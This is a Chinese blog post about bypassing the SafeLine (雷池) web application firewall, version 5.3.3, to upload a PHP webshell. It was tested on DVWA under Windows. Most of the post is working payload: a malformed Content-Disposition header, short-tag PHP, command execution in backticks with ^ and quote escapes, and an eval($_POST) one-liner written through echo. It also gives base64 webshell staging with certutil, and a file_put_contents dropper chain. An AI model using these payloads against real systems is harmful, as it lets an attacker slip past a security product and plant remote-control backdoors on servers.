<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0UXq6f9IMqshSGgSjKG3Vg)

**免责声明：**

* * *

* * *

本文所涉及的任何技术、信息或工具，仅供学习和参考之用。请勿利用本文提供的信息从事任何违法活动或不当行为。任何因使用本文所提供的信息或工具而导致的损失、后果或不良影响，均由使用者个人承担责任，与本文作者无关。作者不对任何因使用本文信息或工具而产生的损失或后果承担任何责任。使用本文所提供的信息或工具即视为同意本免责声明，并承诺遵守相关法律法规和道德规范。

**一、前言**

本来，已经写好了一个绕过的方法，写了一整天，开开心心更新了雷池的版本，发现失效了，我 tm

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQayuT8Kpmn1PDbn6jiaLs1ankc1LZrYO4HtXE9EufIBV3SwwylrfpJtQ/640?wx_fmt=png&from=appmsg)

只能无奈重新测出来了个新方法。  

**二、环境**

**Web 环境**：PHP/7.3.4，直接通过小皮启动的临时 Web 环境，不同版本之间可能会存在测试结果不一致的情况。用的 dvwa 做测试

**系统环境**：Windows

**版本**：5.3.3

**防护等级**：高强度防护

**测试时间**：2024.04.23

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQL5IuW3xiaDMClC8vwupG7OicM9yics2OicpOoOCePtuG5icaWxSruexfERA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQ8MicdaeZwGFMbwA1Pa8PyicS0ODRov4jjNWrB7lbGQ9kuvCIicRuicoNcw/640?wx_fmt=png&from=appmsg)

**三、正文**

文件上传，首先肯定是文件名，感谢 along 师傅提供的文件名绕过思路

```
Content-Disposition: form-data;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
Content-Type: image/jpeg

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQoCanx7toib4s0x7VJNdXloQPp7X44WNA51bCqjGW4AGF6jOLu3YicGkQ/640?wx_fmt=png&from=appmsg)

其次，就是内容问题了，先试一下输出内容总所周知，php 有 3 种文件头，分别是 <?php ?>, <? ?>, <?= ?>

```
<?php echo '123';?>  （拦截）（大多都被拦截）
<?= 123; ?>  （绕过）

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQMDXdhBibPWqHV6cA154rNVuzA0iaGI1ic1iaibXh47YjuwTJKAkuMGuYh7A/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQZhDszksGiatibYuia14Hnmz66tgia5m5d7xfXyooEHt2iaJXGLVjFGPia1ibQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQknL39ByhyicrwVSB7A0AtN5Y4zpPgzsoJh6TY8kpiac8IibhjROR03w5A/640?wx_fmt=png&from=appmsg)

**执行命令 (windows)**：

```
<?= `"whoami"` ?>
由于直接用whoami会被拦截，这里采用""来绕过，当然也支持其他符号绕过

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQGkFh9Y1ZibrXapx90g24nw7QyFM8CzG112Rkvt9yLUbjHrBUF5xUcNg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQAbMuUUGRXKSqZJ3IwQNZkCOU1VFs26jM2zQgfkiampJic6HscVrAr0Tg/640?wx_fmt=png&from=appmsg)

### **phpinfo**：

### 没有什么好的想法去绕，这里采用命令创建文件的方法

ps：上次版本不拦截 echo，这里拦截了，用 ^ 符号来绕过

```
<?= `ec^ho ^<? phpinfo(); > te3.php` ?>
访问上传的te12.php，会生成一个te3.php的文件，就是我们写的内容

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQO5wELXoc1Xthic81K9T95iaaz8yJaQLdbREr04ZDM6ba5uIZkIZe3QFw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQv1gtHhicBSkCv1yXibxlqwpkIQzia8HrKkpZelPVicgZxJ9SOlZzFF4ib2Q/640?wx_fmt=png&from=appmsg)

#### **一句话**：

坑点来了，会拦截 $ 这个符号，由于环境是 Windows，这里采用 ^ 符号来进行绕过

```
<?= `ec^ho ^<? eval(^$^_POST["aaa"]); > te4.php` ?>
访问上传的te12.php，会生成一个te4.php的文件，就是我们写的一句话

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQFiaiawUvLkYYDSzZibFtYRONwNQ8ibCFWTMyzjFaWouvfAJ8OCo3ceEsmQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQLkDEJjwAkLThLgspaJOhpn6sFhaZCs1rxrdx6e5el8PxYAD9icT5LcQ/640?wx_fmt=png&from=appmsg)

**webshell**：  

普通一句话会被流量检测，需要上传加密的 shell  

方法一：

短的一句话可以写，但是要写太长的 webshell 怎么办？，Linux 可以直接命令用 base64 编码等等方式绕过，Windows 的话就只能通过写文件来绕过了：

```
<?= `ec^ho (base64编码的webshell) > xxx.txt` ?>
<?= `ce^rtutil -decode xxx.txt base64-decode.php` ?>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQdHXiabOCkXSQU2s9EfRw2duuaTHDiczUdUWmyPCmOLW6YfAsX4kr3bWA/640?wx_fmt=png&from=appmsg)

访问上传的 php 文件，会将目录的 txt 解码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQy9jMSVbeEYkcV6uFCiaI7HPS9fhlsHkvMHKFEADEvksRMHMnMNibXvxA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQ8e6DF5Qticlpv4GQDqcVvDHuXFyicYGyI7PXxQiaRMlUgdUExzaPO6cSA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQptdhibhWutPTqVAmibpj3RP7v2l1HpiacN43v3qn3bn0ajM4nvsV18WMQ/640?wx_fmt=png&from=appmsg)

方法二：

试用 php 来写文件

```
<?= `ec^ho ^<?php file_put_contents('hhhh3.php',base64_decode('(base64编码的webshell)')); ?^> >hhhh2.php ` ?>

```

上传一个 hhhh1 的 php，访问 hhhh1.php 会生成一个 hhhh2.php 的文件，随后再访问 hhhh2.php 会再生成一个 hhhh3.php 的文件，也就是我们要的 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQnNTLwGRgCjQFLAIibdfeV3u3uxFpic2ibsk5tM9nlNrJjyGB2TLSOVILg/640?wx_fmt=png&from=appmsg)

  
欢迎各位师傅进群交流

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQMogjpd2xzMH29SeZCC1mJ1wfKF6lvpSv1DkVicccQgv0VLMqFicpVt4Q/640?wx_fmt=jpeg&from=appmsg)

广告时间到

提供高质量原创文章可以免费加入星球

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SRxdB5iamrDOjpcsVc6W37jQfQTrbPFa9Lh4eqv5uAdXHeAojmn1DVru28Hg2m7ppzzYarUxm7pWDw/640?wx_fmt=png&from=appmsg)